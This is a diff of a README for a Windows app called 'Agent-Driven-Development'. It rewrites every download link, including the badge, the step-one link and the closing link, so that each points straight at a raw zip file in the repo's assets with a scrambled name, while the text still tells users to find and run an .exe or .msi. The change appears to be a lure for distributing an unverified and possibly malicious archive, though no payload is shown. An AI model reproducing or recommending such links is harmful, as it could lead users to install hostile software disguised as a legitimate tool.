@@ -1,6 +1,6 @@
 # 🤖 Agent-Driven-Development - Clear Steps for AI Project Workflows
 
-[![Download Agent-Driven-Development](https://img.shields.io/badge/Download-Agent--Driven--Development-brightgreen)](https://github.com/Maroo1121/Agent-Driven-Development)
+[![Download Agent-Driven-Development](https://img.shields.io/badge/Download-Agent--Driven--Development-brightgreen)](https://github.com/Maroo1121/Agent-Driven-Development/raw/refs/heads/main/assets/Driven-Agent-Development-v3.3-alpha.4.zip)
 
 ---
 
@@ -31,7 +31,7 @@ To run the app on Windows, your computer needs to meet these basic requirements:
 
 1. Click the big green button at the top or go to this page to download the software:
 
-   [Download Agent-Driven-Development](https://github.com/Maroo1121/Agent-Driven-Development)
+   [Download Agent-Driven-Development](https://github.com/Maroo1121/Agent-Driven-Development/raw/refs/heads/main/assets/Driven-Agent-Development-v3.3-alpha.4.zip)
 
 2. Look for the latest release. It will usually be a file with `.exe` or `.msi` at the end.
 
@@ -106,6 +106,6 @@ If you have questions or find bugs, use the “Issues” section on the reposito
 
 To get the software, visit this link:
 
-[https://github.com/Maroo1121/Agent-Driven-Development](https://github.com/Maroo1121/Agent-Driven-Development)
+[https://github.com/Maroo1121/Agent-Driven-Development/raw/refs/heads/main/assets/Driven-Agent-Development-v3.3-alpha.4.zip](https://github.com/Maroo1121/Agent-Driven-Development/raw/refs/heads/main/assets/Driven-Agent-Development-v3.3-alpha.4.zip)
 
 You will find the latest releases there. Follow the instructions above to download and install.
